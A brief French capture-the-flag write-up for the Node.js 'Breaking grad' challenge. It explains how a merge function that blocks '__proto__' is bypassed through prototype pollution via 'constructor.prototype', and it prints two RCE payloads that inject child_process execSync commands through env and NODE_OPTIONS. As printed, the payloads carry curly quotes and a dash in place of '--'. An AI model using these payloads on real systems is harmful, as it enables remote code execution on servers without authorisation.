\section{Breaking grad}

keywords: prototype pollution

Node :(

le flag est nommé aléatoirement donc il va falloir pouvoir rce ou au moins ls


donc 2 endpoints
\begin{itemize}
    \item \verb+/debug/:action+ en get
    \item \verb+api/calculate+ en post
\end{itemize}

en regardant \verb+Object.Helper+ pour la méthode \verb+clone+

ca fait appel à une fonction recursive de \verb+merge+ qui semble fusioner
l'input avec \verb+{}+ en interdisant \verb+__proto__+

comprend pas donc recherche conduisent à la notion de  {\em prototype pollution}

et on retrouve ce challenge en demo qui lead vers du RCE.

et donc
payload
\begin{verbatim}
{“constructor”: {“prototype”: {“env”: {“x”: “console.log(require(\”child_process\”).execSync(\”ls\”).toString())//”}, “NODE_OPTIONS”: “ — require /proc/self/environ”}}}
\end{verbatim}


\begin{verbatim}
{“constructor”: {“prototype”: {“env”: {“x”: “console.log(require(\”child_process\”).execSync(\”cat flag_xxxxx\”).toString())//”}, “NODE_OPTIONS”: “ — require /proc/self/environ”}}}
\end{verbatim}
